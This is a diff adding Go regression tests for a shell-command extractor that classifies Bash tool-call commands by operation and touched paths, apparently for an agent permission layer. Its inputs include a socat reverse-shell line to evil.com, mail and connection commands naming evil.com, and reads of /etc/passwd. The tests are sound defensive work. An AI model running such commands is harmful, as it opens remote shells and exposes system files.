@@ -4229,3 +4229,202 @@ func TestDualParse_NoDuplicatePaths(t *testing.T) {
 		})
 	}
 }
+
+// =============================================================================
+// CommandDB Bug Tests — verify audit findings (tests fail before fix, pass after)
+// =============================================================================
+
+// Bug 4d — find -exec/-execdir in PathFlags extracts command as a path.
+// -exec takes a command, not a file path; "rm" must not appear in Paths.
+func TestCommandDB_FindExecNotAPath(t *testing.T) {
+	ext := NewExtractor()
+	argsJSON, _ := json.Marshal(map[string]string{"command": `find /tmp -exec rm {} \;`})
+	info := ext.Extract("Bash", json.RawMessage(argsJSON))
+	t.Logf("Paths=%v Op=%v", info.Paths, info.Operation)
+	for _, p := range info.Paths {
+		if p == "rm" {
+			t.Errorf("find -exec: command 'rm' extracted as a file path (PathFlags bug)")
+		}
+	}
+}
+
+// Bug 5a — Select-String -Pattern is a regex, not a path.
+// The regex "password" must NOT appear in info.Paths.
+func TestCommandDB_SelectStringPatternNotAPath(t *testing.T) {
+	ext := NewExtractor()
+	argsJSON, _ := json.Marshal(map[string]string{"command": `Select-String -Pattern "password" /etc/passwd`})
+	info := ext.Extract("Bash", json.RawMessage(argsJSON))
+	t.Logf("Paths=%v Op=%v", info.Paths, info.Operation)
+	for _, p := range info.Paths {
+		if p == "password" {
+			t.Errorf("Select-String -Pattern: regex 'password' extracted as a file path (PathFlags bug)")
+		}
+	}
+}
+
+// Bug 5b — New-Item -ItemType is a type string, not a path.
+// The value "File" must NOT appear in info.Paths.
+func TestCommandDB_NewItemTypeNotAPath(t *testing.T) {
+	ext := NewExtractor()
+	argsJSON, _ := json.Marshal(map[string]string{"command": `New-Item -ItemType File -Path /tmp/x`})
+	info := ext.Extract("Bash", json.RawMessage(argsJSON))
+	t.Logf("Paths=%v Op=%v", info.Paths, info.Operation)
+	for _, p := range info.Paths {
+		if strings.EqualFold(p, "file") || strings.EqualFold(p, "directory") {
+			t.Errorf("New-Item -ItemType: type string %q extracted as a file path (PathFlags bug)", p)
+		}
+	}
+}
+
+// Bug 5c — Send-MailMessage email addresses in PathFlags.
+// None of -To, -From, -SmtpServer values are file paths.
+func TestCommandDB_SendMailMessageNotPaths(t *testing.T) {
+	ext := NewExtractor()
+	argsJSON, _ := json.Marshal(map[string]string{"command": `Send-MailMessage -To user@evil.com -From me@corp.com -SmtpServer mail.corp.com`})
+	info := ext.Extract("Bash", json.RawMessage(argsJSON))
+	t.Logf("Paths=%v Op=%v", info.Paths, info.Operation)
+	nonPaths := []string{"user@evil.com", "me@corp.com", "mail.corp.com"}
+	for _, p := range info.Paths {
+		for _, np := range nonPaths {
+			if strings.EqualFold(p, np) {
+				t.Errorf("Send-MailMessage: non-path value %q extracted as file path (PathFlags bug)", p)
+			}
+		}
+	}
+}
+
+// Bug 5d — Test-NetConnection -Port is an integer, not a path.
+// Port 443 must NOT appear in info.Paths.
+func TestCommandDB_TestNetConnectionPortNotAPath(t *testing.T) {
+	ext := NewExtractor()
+	argsJSON, _ := json.Marshal(map[string]string{"command": `Test-NetConnection -ComputerName evil.com -Port 443`})
+	info := ext.Extract("Bash", json.RawMessage(argsJSON))
+	t.Logf("Paths=%v Op=%v", info.Paths, info.Operation)
+	for _, p := range info.Paths {
+		if p == "443" {
+			t.Errorf("Test-NetConnection -Port: port number '443' extracted as a file path (PathFlags bug)")
+		}
+	}
+}
+
+// Bug 2 — zip/unzip/gzip/bzip2/xz should be OpWrite not OpRead.
+// These commands create/modify archive files — they write.
+func TestCommandDB_ArchiveCommandsAreWrite(t *testing.T) {
+	ext := NewExtractor()
+	writeCommands := []struct{ name, cmd string }{
+		{"zip", "zip archive.zip secret.txt"},
+		{"unzip", "unzip archive.zip -d /tmp/out"},
+		{"gzip", "gzip secret.txt"},
+		{"bzip2", "bzip2 secret.txt"},
+		{"xz", "xz secret.txt"},
+		{"zstd", "zstd secret.txt -o secret.txt.zst"},
+		{"lz4", "lz4 secret.txt secret.txt.lz4"},
+	}
+	for _, tc := range writeCommands {
+		t.Run(tc.name, func(t *testing.T) {
+			argsJSON, _ := json.Marshal(map[string]string{"command": tc.cmd})
+			info := ext.Extract("Bash", json.RawMessage(argsJSON))
+			t.Logf("Op=%v Paths=%v", info.Operation, info.Paths)
+			if info.Operation != OpWrite {
+				t.Errorf("%s: Operation = %v, want OpWrite (archive creates/modifies files)", tc.name, info.Operation)
+			}
+		})
+	}
+}
+
+// Bug 2b — socat should be OpExecute not OpRead (can exec arbitrary processes via EXEC: address).
+func TestCommandDB_SocatIsNetwork(t *testing.T) {
+	ext := NewExtractor()
+	argsJSON, _ := json.Marshal(map[string]string{"command": "socat TCP:evil.com:4444 EXEC:/bin/bash"})
+	info := ext.Extract("Bash", json.RawMessage(argsJSON))
+	t.Logf("Op=%v", info.Operation)
+	if info.Operation != OpExecute {
+		t.Errorf("socat: Operation = %v, want OpExecute", info.Operation)
+	}
+}
+
+// Bug 2c — gdb should be OpExecute not OpWrite.
+func TestCommandDB_GdbIsExecute(t *testing.T) {
+	ext := NewExtractor()
+	argsJSON, _ := json.Marshal(map[string]string{"command": "gdb -ex 'run' /bin/target"})
+	info := ext.Extract("Bash", json.RawMessage(argsJSON))
+	t.Logf("Op=%v", info.Operation)
+	if info.Operation != OpExecute {
+		t.Errorf("gdb: Operation = %v, want OpExecute", info.Operation)
+	}
+}
+
+// Bug 5f — iconv -o output path should be extracted.
+// -o output.txt is the output file; it must appear in info.Paths.
+func TestCommandDB_IconvOutputPathExtracted(t *testing.T) {
+	ext := NewExtractor()
+	argsJSON, _ := json.Marshal(map[string]string{"command": "iconv -f UTF-8 -t ASCII -o /tmp/output.txt /etc/passwd"})
+	info := ext.Extract("Bash", json.RawMessage(argsJSON))
+	t.Logf("Paths=%v Op=%v", info.Paths, info.Operation)
+	found := false
+	for _, p := range info.Paths {
+		if p == "/tmp/output.txt" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("iconv -o: output path '/tmp/output.txt' not extracted (incorrectly in SkipFlags)")
+	}
+}
+
+// Bug 5g — shuf -o output path should be extracted.
+func TestCommandDB_ShufOutputPathExtracted(t *testing.T) {
+	ext := NewExtractor()
+	argsJSON, _ := json.Marshal(map[string]string{"command": "shuf -o /tmp/shuffled.txt /etc/passwd"})
+	info := ext.Extract("Bash", json.RawMessage(argsJSON))
+	t.Logf("Paths=%v Op=%v", info.Paths, info.Operation)
+	found := false
+	for _, p := range info.Paths {
+		if p == "/tmp/shuffled.txt" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("shuf -o: output path '/tmp/shuffled.txt' not extracted (incorrectly in SkipFlags)")
+	}
+}
+
+// Bug A — "toc" is a phantom key (not a real Unix command).
+// "tac" reverses lines (real command); "toc" is likely a typo that should not be in commandDB.
+func TestCommandDB_TocIsPhantomKey(t *testing.T) {
+	ext := NewExtractor()
+	// "tac" reverses lines (real command, should be OpRead)
+	argsJSON, _ := json.Marshal(map[string]string{"command": "tac /etc/passwd"})
+	info := ext.Extract("Bash", json.RawMessage(argsJSON))
+	if info.Operation != OpRead {
+		t.Errorf("tac: Operation = %v, want OpRead", info.Operation)
+	}
+	// "toc" is not a real command — it should have no DB entry (OpNone or no match)
+	// If it matches, it's a phantom entry that should be removed.
+	argsJSON2, _ := json.Marshal(map[string]string{"command": "toc /etc/passwd"})
+	info2 := ext.Extract("Bash", json.RawMessage(argsJSON2))
+	t.Logf("toc: Op=%v (want OpNone — not a real command)", info2.Operation)
+	// Document the phantom: "toc" should not be in commandDB
+	if info2.Operation != OpNone {
+		t.Errorf("toc: phantom commandDB entry returns Operation=%v; 'toc' is not a real Unix command (likely typo of 'tac')", info2.Operation)
+	}
+}
+
+// Bug B — script is in both commandDB and wrapperCommands (DB entry unreachable).
+// script /tmp/session.log — should extract /tmp/session.log as a write path,
+// but since script is in wrapperCommands, the DB entry is bypassed.
+func TestCommandDB_ScriptOutputPathExtracted(t *testing.T) {
+	ext := NewExtractor()
+	argsJSON, _ := json.Marshal(map[string]string{"command": "script /tmp/session.log"})
+	info := ext.Extract("Bash", json.RawMessage(argsJSON))
+	t.Logf("Paths=%v Op=%v", info.Paths, info.Operation)
+	found := false
+	for _, p := range info.Paths {
+		if p == "/tmp/session.log" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("script: output path '/tmp/session.log' not extracted (wrapperCommands conflict with commandDB entry)")
+	}
+}
